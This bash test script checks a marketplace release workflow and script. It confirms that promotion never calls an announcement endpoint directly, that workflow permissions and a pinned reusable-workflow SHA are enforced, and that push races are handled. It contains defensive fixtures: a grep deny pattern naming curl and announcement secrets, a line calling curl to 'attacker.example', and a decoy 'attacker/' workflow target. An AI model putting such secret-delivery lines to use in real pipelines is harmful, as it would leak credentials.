#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

HARDENED_SHA='08f7d22f3a5b59b1658ab2e96a20d0d3c352869c'
RETIRED_SHA='c981b872ebf650805200ad72c8b7142232f8b3f6'
ANNOUNCE_WORKFLOW='StartupBros-com/hov-marketplace/.github/workflows/hov-tool-drop-announce.yml'
HARDENED_USES="$ANNOUNCE_WORKFLOW@$HARDENED_SHA"
ANNOUNCE_IF="github.event.release.draft == false && github.event.release.prerelease == false && needs.promote.result == 'success'"

pass() { printf 'ok - %s\n' "$1"; }
fail() { printf 'not ok - %s\n' "$1" >&2; exit 1; }
assert_eq() { [[ "$1" == "$2" ]] || fail "$3: expected $2, got $1"; pass "$3"; }

validate_release_policy() {
  local workflow="$1" script="$2" json
  if grep -Eq 'TOOL_RELEASE_ANNOUNCE_(SECRET|URL)|ANNOUNCE_(SECRET|URL)|x-tool-release-announce-secret|/api/internal/ops/tool-releases|(^|[[:space:]])curl([[:space:]]|$)' "$workflow" "$script"; then
    printf 'direct Tool Drop delivery surface is forbidden\n' >&2
    return 1
  fi
  if ! json="$(yq -o=json '.' "$workflow" 2>/dev/null)"; then
    printf 'release workflow must parse as YAML\n' >&2
    return 1
  fi
  jq -e '.on.release.types == ["published", "edited"]' <<<"$json" >/dev/null || {
    printf 'release events must be exactly published and edited\n' >&2
    return 1
  }
  jq -e '.permissions == {"contents": "read"}' <<<"$json" >/dev/null || {
    printf 'workflow permissions must be exactly contents read\n' >&2
    return 1
  }
  jq -e --arg key '${{ secrets.HOV_MARKETPLACE_DEPLOY_KEY }}' \
    'any(.jobs.promote.steps[]?; .with."ssh-key" == $key)' <<<"$json" >/dev/null || {
    printf 'promotion must retain the marketplace deploy key\n' >&2
    return 1
  }
  jq -e --arg uses "$HARDENED_USES" '.jobs.announce.uses == $uses' <<<"$json" >/dev/null || {
    printf 'announce job must use the hardened immutable workflow\n' >&2
    return 1
  }
  jq -e '.jobs.announce.needs == "promote"' <<<"$json" >/dev/null || {
    printf 'announce job must depend on promotion\n' >&2
    return 1
  }
  jq -e --arg condition "$ANNOUNCE_IF" '.jobs.announce.if == $condition' <<<"$json" >/dev/null || {
    printf 'announce job must retain the stable release gate\n' >&2
    return 1
  }
  jq -e '.jobs.announce.permissions == {"contents": "read", "id-token": "write"}' <<<"$json" >/dev/null || {
    printf 'announce permissions must be exactly contents read and id-token write\n' >&2
    return 1
  }
  jq -e '(.jobs.announce | keys | sort) == ["if", "name", "needs", "permissions", "uses"]' <<<"$json" >/dev/null || {
    printf 'announce job may not add inputs, secrets, or unrelated behavior\n' >&2
    return 1
  }
}

assert_policy_failure() {
  local label="$1" diagnostic="$2" workflow="$3" script="$4" output status
  if output="$(validate_release_policy "$workflow" "$script" 2>&1)"; then
    status=0
  else
    status=$?
  fi
  if [[ "$status" -eq 1 && "$output" == *"$diagnostic"* ]]; then
    pass "$label"
  else
    fail "$label: expected exit 1 with [$diagnostic], got exit $status and [$output]"
  fi
}

mkdir -p "$TMP/bin" "$TMP/source/.claude-plugin"
printf '#!/usr/bin/env bash\nprintf "%%s\\n" "$*" >> "$CURL_LOG"\n' > "$TMP/bin/curl"
chmod +x "$TMP/bin/curl"
printf '{"name":"token-eater","version":"0.1.1"}\n' > "$TMP/source/.claude-plugin/plugin.json"
git -C "$TMP/source" init -q
git -C "$TMP/source" config user.email test@example.com
git -C "$TMP/source" config user.name Test
git -C "$TMP/source" add .
git -C "$TMP/source" commit -qm source
git -C "$TMP/source" tag v0.1.1
SOURCE_SHA="$(git -C "$TMP/source" rev-parse HEAD)"

mkdir -p "$TMP/seed/.claude-plugin" "$TMP/seed/scripts"
printf '%s\n' '{"name":"hov","owner":{"name":"House of Vibe","url":"https://houseofvibe.ai"},"metadata":{"description":"test","version":"0.2.0"},"plugins":[{"name":"token-eater","description":"test","source":{"source":"url","url":"https://github.com/StartupBros-com/token-eater.git","sha":"0000000000000000000000000000000000000000"}},{"name":"pro-gate","description":"test","source":{"source":"url","url":"https://github.com/StartupBros-com/pro-gate.git","sha":"1111111111111111111111111111111111111111"}}]}' > "$TMP/seed/.claude-plugin/marketplace.json"
printf '#!/usr/bin/env bash\nexit 0\n' > "$TMP/seed/scripts/validate-marketplace.sh"
chmod +x "$TMP/seed/scripts/validate-marketplace.sh"
git -C "$TMP/seed" init -q
git -C "$TMP/seed" config user.email test@example.com
git -C "$TMP/seed" config user.name Test
git -C "$TMP/seed" add .
git -C "$TMP/seed" commit -qm seed
git -C "$TMP/seed" branch -M main
git clone -q --bare "$TMP/seed" "$TMP/marketplace.git"
git clone -q "$TMP/marketplace.git" "$TMP/marketplace"
git -C "$TMP/marketplace" config user.email test@example.com
git -C "$TMP/marketplace" config user.name Test

REAL_GIT="$(command -v git)"
cat > "$TMP/bin/git" <<'GIT_WRAPPER'
#!/usr/bin/env bash
set -euo pipefail
if [[ "${1:-}" == push && "${RACE_ON_FIRST_PUSH:-0}" == 1 && ! -e "$RACE_MARKER" ]]; then
  touch "$RACE_MARKER"
  remote="$($REAL_GIT remote get-url origin)"
  competitor="$(mktemp -d)"
  "$REAL_GIT" clone -q "$remote" "$competitor"
  "$REAL_GIT" -C "$competitor" config user.email competitor@example.com
  "$REAL_GIT" -C "$competitor" config user.name Competitor
  output="$(mktemp)"
  jq '(.plugins[] | select(.name == "pro-gate")) |= (.metadata = {version:"0.1.0",releaseId:301,releaseTag:"v0.1.0"})' "$competitor/.claude-plugin/marketplace.json" > "$output"
  mv "$output" "$competitor/.claude-plugin/marketplace.json"
  "$REAL_GIT" -C "$competitor" add .claude-plugin/marketplace.json
  "$REAL_GIT" -C "$competitor" commit -qm 'competing pro-gate promotion'
  "$REAL_GIT" -C "$competitor" push -q origin HEAD:main
  rm -rf "$competitor"
fi
exec "$REAL_GIT" "$@"
GIT_WRAPPER
chmod +x "$TMP/bin/git"
export REAL_GIT RACE_MARKER="$TMP/race-marker" RACE_ON_FIRST_PUSH=1
export PATH="$TMP/bin:$PATH" CURL_LOG="$TMP/curl.log"
: > "$CURL_LOG"
common=(
  EVENT_ACTION=published REPOSITORY=token-eater RELEASE_ID=101 RELEASE_TAG=v0.1.1
  RELEASE_PRERELEASE=false RELEASE_DRAFT=false LATEST_STABLE_ID=101 SOURCE_ROOT="$TMP/source"
  SOURCE_SHA="$SOURCE_SHA" MARKETPLACE_DIR="$TMP/marketplace"
)
env "${common[@]}" "$ROOT/scripts/release-train.sh" >/dev/null
fresh="$TMP/fresh"
git clone -q "$TMP/marketplace.git" "$fresh"
assert_eq "$(jq -r '.plugins[] | select(.name=="token-eater") | .metadata.releaseId' "$fresh/.claude-plugin/marketplace.json")" 101 'stable latest release promotes'
assert_eq "$(jq -r '.plugins[] | select(.name=="pro-gate") | .metadata.releaseId' "$fresh/.claude-plugin/marketplace.json")" 301 'push-race retry preserves competing promotion'
assert_eq "$(wc -l < "$CURL_LOG")" 0 'promotion never calls a direct announcement endpoint'

env "${common[@]}" "$ROOT/scripts/release-train.sh" >/dev/null
assert_eq "$(wc -l < "$CURL_LOG")" 0 'rerun remains promotion-only'

env "${common[@]}" RELEASE_ID=100 LATEST_STABLE_ID=100 "$ROOT/scripts/release-train.sh" >/dev/null
assert_eq "$(wc -l < "$CURL_LOG")" 0 'older release no-op never delivers directly'

env "${common[@]}" RELEASE_ID=102 LATEST_STABLE_ID=102 RELEASE_PRERELEASE=true "$ROOT/scripts/release-train.sh" >/dev/null
assert_eq "$(wc -l < "$CURL_LOG")" 0 'prerelease remains promotion and delivery no-op'

assert_eq "$(git -C "$TMP/marketplace" config user.name)" hov-release-bot 'promotion configures repo-local bot name'
assert_eq "$(git -C "$TMP/marketplace" config user.email)" hov-release-bot@users.noreply.github.com 'promotion configures repo-local bot email'

env "${common[@]}" EVENT_ACTION=edited "$ROOT/scripts/release-train.sh" >/dev/null
assert_eq "$(wc -l < "$CURL_LOG")" 0 'edited matching release remains promotion-only'

corrupt="$TMP/corrupt"
git clone -q "$TMP/marketplace.git" "$corrupt"
git -C "$corrupt" config user.email test@example.com
git -C "$corrupt" config user.name Test
jq '(.plugins[] | select(.name == "token-eater") | .source.sha) = "2222222222222222222222222222222222222222"' \
  "$corrupt/.claude-plugin/marketplace.json" > "$corrupt/marketplace.tmp"
mv "$corrupt/marketplace.tmp" "$corrupt/.claude-plugin/marketplace.json"
git -C "$corrupt" add .claude-plugin/marketplace.json
git -C "$corrupt" commit -qm 'corrupt immutable promotion tuple'
git -C "$corrupt" push -q origin HEAD:main
if env "${common[@]}" EVENT_ACTION=edited "$ROOT/scripts/release-train.sh" >/dev/null 2>&1; then
  fail 'edited release repairs immutable drift under the same release ID'
fi
assert_eq "$(wc -l < "$CURL_LOG")" 0 'same-ID drift fails closed without direct delivery'

RACE_ON_FIRST_PUSH=0
env "${common[@]}" EVENT_ACTION=edited RELEASE_ID=102 LATEST_STABLE_ID=102 "$ROOT/scripts/release-train.sh" >/dev/null
assert_eq "$(wc -l < "$CURL_LOG")" 0 'newly stable edited release promotes without direct delivery'
assert_eq "$(jq -r '.plugins[] | select(.name=="token-eater") | .metadata.releaseId' "$TMP/marketplace/.claude-plugin/marketplace.json")" 102 'newly stable edited release advances marketplace'

env "${common[@]}" EVENT_ACTION=edited RELEASE_PRERELEASE=true "$ROOT/scripts/release-train.sh" >/dev/null
assert_eq "$(wc -l < "$CURL_LOG")" 0 'edited prerelease remains production no-op'

WF="$ROOT/.github/workflows/release-train.yml"
SCRIPT="$ROOT/scripts/release-train.sh"
validate_release_policy "$WF" "$SCRIPT"
pass 'checked-in release train uses the hardened OIDC policy'

mkdir -p "$TMP/policy"
if ! python3 - "$WF" "$SCRIPT" "$TMP/policy" "$HARDENED_USES" "$RETIRED_SHA" <<'PY'
import sys
from pathlib import Path

workflow_path, script_path, output_dir, hardened_uses, retired_sha = sys.argv[1:]
workflow = Path(workflow_path).read_text()
script = Path(script_path).read_text()
out = Path(output_dir)
uses_line = f"    uses: {hardened_uses}"
assert workflow.count(uses_line) == 1

retired = workflow.replace(uses_line, uses_line.replace(hardened_uses.rsplit("@", 1)[1], retired_sha), 1)
assert retired != workflow and retired_sha in retired
(out / "retired.yml").write_text(retired)

decoy = workflow.replace(
    uses_line,
    f"    uses: attacker/hov-marketplace/.github/workflows/hov-tool-drop-announce.yml@{hardened_uses.rsplit('@', 1)[1]}\n"
    f"\n  decoy:\n    uses: {hardened_uses}",
    1,
)
assert decoy != workflow and decoy.count(hardened_uses) == 1 and "\n  decoy:\n" in decoy
(out / "decoy.yml").write_text(decoy)

shadowed = workflow.replace("      id-token: write", "      id-token: read", 1)
assert shadowed != workflow
(out / "shadowed.yml").write_text(shadowed)

secret_script = script + "\nANNOUNCE_SECRET=forbidden-test-fixture\ncurl https://attacker.example\n"
assert secret_script != script and "ANNOUNCE_SECRET" in secret_script and "curl https://" in secret_script
(out / "secret-script.sh").write_text(secret_script)
PY
then
  fail 'policy fixture generation failed'
fi
for fixture in retired.yml decoy.yml shadowed.yml secret-script.sh; do
  [[ -s "$TMP/policy/$fixture" ]] || fail "missing generated fixture: $fixture"
done

assert_policy_failure 'retired workflow pin is rejected' \
  'announce job must use the hardened immutable workflow' "$TMP/policy/retired.yml" "$SCRIPT"
assert_policy_failure 'blessed-SHA decoy cannot hide an attacker announce target' \
  'announce job must use the hardened immutable workflow' "$TMP/policy/decoy.yml" "$SCRIPT"
assert_policy_failure 'job-level permission shadowing is rejected' \
  'announce permissions must be exactly contents read and id-token write' "$TMP/policy/shadowed.yml" "$SCRIPT"
assert_policy_failure 'direct secret delivery cannot return in the release script' \
  'direct Tool Drop delivery surface is forbidden' "$WF" "$TMP/policy/secret-script.sh"

echo 'ALL PASS'
